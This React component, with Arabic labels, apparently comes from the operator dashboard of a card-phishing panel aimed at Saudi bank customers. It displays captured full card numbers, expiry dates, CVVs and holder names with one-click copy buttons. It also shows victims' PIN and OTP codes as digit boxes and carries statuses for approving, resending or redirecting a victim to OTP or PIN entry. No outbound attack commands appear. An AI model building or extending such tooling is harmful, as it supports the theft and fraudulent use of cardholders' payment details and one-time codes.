"use client"

import { ReactNode, useEffect, useRef, useState } from "react"
import { toast } from "sonner"

interface DataBubbleProps {
  title: string
  data: Record<string, any>
  timestamp?: string | Date
  status?: "pending" | "approved" | "rejected"
  pendingAction?: string | null
  showActions?: boolean
  isLatest?: boolean
  actions?: ReactNode
  icon?: string
  color?: "blue" | "green" | "purple" | "orange" | "pink" | "indigo" | "gray"
  layout?: "vertical" | "horizontal"
}

type CopyableCardField = "cardNumber" | "expiryDate" | "cvv"

const copyFieldLabels: Record<CopyableCardField, string> = {
  cardNumber: "رقم البطاقة",
  expiryDate: "تاريخ الانتهاء",
  cvv: "CVV"
}

const getBankLogoUrl = (bankName: string): string | null => {
  const n = (bankName || "").toLowerCase()
  if (n.includes("أهلي") || n.includes("ahli") || n.includes("snb") || n.includes("national")) return "/logo-snb.png"
  if (n.includes("راجح") || n.includes("rajhi")) return "/logo-rajhi.png"
  if (n.includes("رياض") || n.includes("riyad")) return "/logo-riyad.jpg"
  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma")) return "/logo-alinma.png"
  return null
}

const getNetworkLogoUrl = (brand: string): string | null => {
  if (brand === "MADA") return "/logo-mada.png"
  if (brand === "VISA") return "/logo-visa.png"
  if (brand === "MASTERCARD") return "/logo-mastercard.png"
  return null
}

export function DataBubble({
  title,
  data,
  timestamp,
  status,
  pendingAction,
  showActions,
  isLatest,
  actions,
  icon,
  color: _color,
  layout: _layout = "vertical"
}: DataBubbleProps) {
  const [copiedField, setCopiedField] = useState<CopyableCardField | null>(null)
  const copyResetTimeoutRef = useRef<number | null>(null)

  useEffect(() => {
    return () => {
      if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    }
  }, [])

  const isCopyableValue = (value: string) => {
    const t = value.trim()
    return !(!t || t.includes("•") || t.includes("*") || t === "غير محدد")
  }

  const copyWithFallback = async (value: string) => {
    const normalized = value.trim()
    if (!normalized || typeof window === "undefined") return false
    const fallback = () => {
      const el = document.createElement("textarea")
      el.value = normalized
      el.setAttribute("readonly", "")
      el.style.cssText = "position:fixed;top:-1000px;opacity:0"
      document.body.appendChild(el)
      el.focus()
      el.select()
      const ok = document.execCommand("copy")
      document.body.removeChild(el)
      return ok
    }
    if (navigator.clipboard && window.isSecureContext) {
      try { await navigator.clipboard.writeText(normalized); return true } catch { return fallback() }
    }
    return fallback()
  }

  const handleCopy = async (field: CopyableCardField, value: string) => {
    if (!isCopyableValue(value)) { toast.error("لا توجد قيمة قابلة للنسخ"); return }
    const ok = await copyWithFallback(value)
    if (!ok) { toast.error("تعذر نسخ القيمة"); return }
    setCopiedField(field)
    if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    copyResetTimeoutRef.current = window.setTimeout(() => {
      setCopiedField(c => c === field ? null : c)
    }, 1500)
    toast.success(`تم نسخ ${copyFieldLabels[field]}`)
  }

  const getStatusBadge = () => {
    // Show pending action if available (immediate feedback during processing)
    if (pendingAction) {
      return (
        <span className="inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border bg-blue-50 text-blue-700 border-blue-200 animate-pulse">
          {pendingAction}
        </span>
      )
    }
    if (!status) return null
    const badges: Record<string, { text: string; className: string }> = {
      pending:           { text: "⏳ قيد المراجعة", className: "bg-yellow-50 text-yellow-700 border-yellow-200" },
      approved:          { text: "✓ تم القبول",     className: "bg-green-50 text-green-700 border-green-200" },
      rejected:          { text: "✗ تم الرفض",      className: "bg-red-50 text-red-600 border-red-200" },
      approved_with_otp: { text: "🔑 تحول OTP",     className: "bg-blue-50 text-blue-700 border-blue-200" },
      approved_with_pin: { text: "🔐 تحول PIN",     className: "bg-purple-50 text-purple-700 border-purple-200" },
      resend:            { text: "🔄 إعادة إرسال",  className: "bg-orange-50 text-orange-700 border-orange-200" },
      message:           { text: "📲 في انتظار الموافقة", className: "bg-amber-50 text-amber-700 border-amber-200 animate-pulse" },
    }
    const badge = badges[status]
    if (!badge) return null
    return (
      <span className={`inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border ${badge.className}`}>
        {badge.text}
      </span>
    )
  }

  const formatTimestamp = (ts: string | Date) => {
    const d = new Date(ts)
    const mm = String(d.getMonth() + 1).padStart(2, "0")
    const dd = String(d.getDate()).padStart(2, "0")
    let h = d.getHours()
    const min = String(d.getMinutes()).padStart(2, "0")
    const ampm = h >= 12 ? "م" : "ص"
    h = h % 12 || 12
    return `${mm}-${dd} | ${h}:${min} ${ampm}`
  }

  const isCardData = title === "معلومات البطاقة" || !!data["رقم البطاقة"] || !!data["نوع البطاقة"]

  if (isCardData) {
    const rawNum     = (data["رقم البطاقة"] || "").toString().replace(/\s+/g, "")
    const cardNumber = rawNum ? (rawNum.match(/.{1,4}/g)?.join("  ") || rawNum) : "••••  ••••  ••••  ••••"
    const rawExpiry  = (data["تاريخ الانتهاء"] || "").toString().trim()
    const expiry     = rawExpiry || "••/••"
    const rawCvv     = (data["CVV"] || "").toString().trim()
    const cvv        = rawCvv || "•••"
    const holder     = data["اسم حامل البطاقة"] || "CARD HOLDER"
    const cardType   = (data["نوع البطاقة"] || "CARD").toString().toUpperCase()
    const cardLevel  = (data["مستوى البطاقة"] || "").toString().trim()
    const bankName   = data["البنك"] || ""
    const bankCountry = data["بلد البنك"] || ""

    const typeLower  = cardType.toLowerCase()
    let brand = "CARD"
    if (typeLower.includes("visa"))   brand = "VISA"
    else if (typeLower.includes("master")) brand = "MASTERCARD"
    else if (typeLower.includes("mada"))   brand = "MADA"
    else if (typeLower.includes("amex") || typeLower.includes("american")) brand = "AMEX"

    const bankLogoUrl = getBankLogoUrl(bankName)
    const networkLogoUrl = getNetworkLogoUrl(brand)

    return (
      <div className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.07)] border border-gray-100" style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}>

        {/* Bubble header */}
        <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
          <div className="flex items-center gap-2">
            {isLatest && (
              <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
            )}
            {timestamp && (
              <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
            )}
          </div>
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>

        <div className="p-4">
          {/* ─── Credit Card Visual (SNB-style light card) ─── */}
          <div
            className="relative rounded-2xl overflow-hidden"
            style={{
              width: "500px",
              height: "400px",
              background: "linear-gradient(135deg, #e8f5ee 0%, #ddf0e6 35%, #cce8d8 65%, #e2f0e8 100%)",
              boxShadow: "0 6px 24px rgba(0,100,50,0.12), 0 2px 6px rgba(0,0,0,0.06)"
            }}
          >
            {/* Sheen overlay */}
            <div className="absolute inset-0 pointer-events-none" style={{ background: "linear-gradient(135deg, rgba(255,255,255,0.45) 0%, transparent 55%)" }} />

            {/* Card inner content */}
            <div className="relative h-full flex flex-col px-5 py-4 justify-between">

              {/* Top row: SAR badge + Bank logo */}
              <div className="flex items-start justify-between">
                <div
                  className="text-sm font-bold text-gray-700"
                  style={{ border: "2px solid #555", borderRadius: "8px", padding: "4px 12px", background: "rgba(255,255,255,0.55)" }}
                >
                  SAR
                </div>
                {bankLogoUrl ? (
                  <div style={{ background: "#fff", borderRadius: "8px", padding: "4px 10px", display: "inline-flex", alignItems: "center", boxShadow: "0 1px 4px rgba(0,0,0,0.08)" }}>
                    <img src={bankLogoUrl} alt={bankName} className="h-8 max-w-[120px] object-contain" />
                  </div>
                ) : (
                  <span className="font-extrabold text-green-900 text-base" style={{ direction: "ltr" }}>
                    {bankName && bankName !== "غير محدد" ? bankName : ""}
                  </span>
                )}
              </div>

              {/* Middle: Card Number (centered) */}
              <div className="flex justify-center">
                <button
                  type="button"
                  onClick={() => void handleCopy("cardNumber", rawNum)}
                  disabled={!isCopyableValue(rawNum)}
                  title="نسخ رقم البطاقة"
                  className="group text-center"
                >
                  <div className="font-mono font-bold tracking-widest text-gray-900 text-4xl group-hover:opacity-70 transition-opacity" style={{ direction: "ltr" }}>
                    {cardNumber}
                  </div>
                </button>
              </div>

              {/* Bottom section: Holder name + Card type (left) + Expiry + CVV (right) */}
              <div className="flex flex-col gap-2">
                {/* Holder name */}
                <div className="text-center">
                  <div className="font-bold text-gray-900 text-base uppercase">{holder}</div>
                </div>

                {/* Card type (left) + Expiry/CVV (right) */}
                <div className="flex items-end justify-between">
                  <div>
                    <span className="text-xs font-bold text-gray-600 uppercase tracking-wide">
                      {[
                        !networkLogoUrl && brand !== "CARD" ? brand : null,
                        cardLevel || null
                      ].filter(Boolean).join(" · ")}
                    </span>
                    <div className="text-xl mt-1">🇸🇦</div>
                  </div>
                  <div className="text-right">
                    <div className="text-xs text-gray-500 font-semibold">CVV  EXPIRES</div>
                    <button
                      type="button"
                      onClick={() => void handleCopy("cvv", rawCvv)}
                      disabled={!isCopyableValue(rawCvv)}
                      title="نسخ CVV"
                      className="group"
                    >
                      <div className="font-mono font-bold text-gray-900 text-base group-hover:opacity-70 transition-opacity" style={{ direction: "ltr" }}>
                        {copiedField === "cvv" ? "✓" : cvv}  {expiry}
                      </div>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* ─── Tags below card ─── */}
          <div className="mt-3 flex flex-wrap gap-1.5">
            {bankName && bankName !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-blue-50 text-blue-700 border border-blue-100">{bankName}</span>
            )}
            {bankCountry && bankCountry !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-100">{bankCountry}</span>
            )}
            {cardType && cardType !== "CARD" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-gray-100 text-gray-700 border border-gray-200">{cardType}</span>
            )}
            {cardLevel && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-amber-50 text-amber-700 border border-amber-100">{cardLevel}</span>
            )}
          </div>
        </div>

        {/* ─── Footer: status + actions ─── */}
        {(status || (showActions && actions)) && (
          <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
            <div>{getStatusBadge()}</div>
            {showActions && actions && <div>{actions}</div>}
          </div>
        )}
      </div>
    )
  }

  // ─────────────────────────────────────────
  // PIN / OTP digit boxes
  // ─────────────────────────────────────────
  const isPinOrOtp =
    title.includes("PIN") || title.includes("OTP") ||
    title.includes("رمز") || title.includes("كود") || title.includes("كلمة مرور")

  let digitValue = ""
  if (isPinOrOtp) {
    const entries = Object.entries(data)
    if (entries.length > 0) digitValue = entries[0][1]?.toString() || ""
  }

  return (
    <div
      className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.06)] border border-gray-100"
      style={{ fontFamily: "Cairo, Tajawal, sans-serif", width: "400px" }}
    >
      {/* Header */}
      <div className="flex items-center justify-center px-4 py-2.5 border-b border-gray-100 relative">
        <div className="flex items-center gap-2">
          {icon && <span className="text-base">{icon}</span>}
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>
        <div className="absolute right-4 flex items-center gap-2">
          {isLatest && (
            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
          )}
          {timestamp && (
            <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
          )}
        </div>
      </div>

      {/* Body */}
      <div className="px-4 py-4">
        {isPinOrOtp && digitValue ? (
          <div className="flex justify-center gap-3 py-4" style={{ direction: "ltr" }}>
            {digitValue.split("").map((digit, i) => (
              <div
                key={i}
                className="w-12 h-14 rounded-lg bg-gray-50 border-2 border-gray-300 shadow-md flex items-center justify-center"
              >
                <span className="text-2xl font-bold text-gray-900">{digit}</span>
              </div>
            ))}
          </div>
        ) : (
          <div className="space-y-3">
            {Object.entries(data).map(([key, value]) => {
              if (value === undefined || value === null) return null
              const str = value?.toString() || "-"
              return (
                <div key={key} className="flex items-center justify-between gap-4 py-2">
                  <span className="text-gray-900 font-semibold text-sm break-words text-left">{str}</span>
                  <span className="text-gray-600 text-sm font-medium shrink-0 text-right whitespace-nowrap">{key}:</span>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* Footer */}
      {(status || (showActions && actions)) && (
        <div className="flex flex-col gap-3 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
          {status && <div className="flex justify-center">{getStatusBadge()}</div>}
          {showActions && actions && <div>{actions}</div>}
        </div>
      )}
    </div>
  )
}
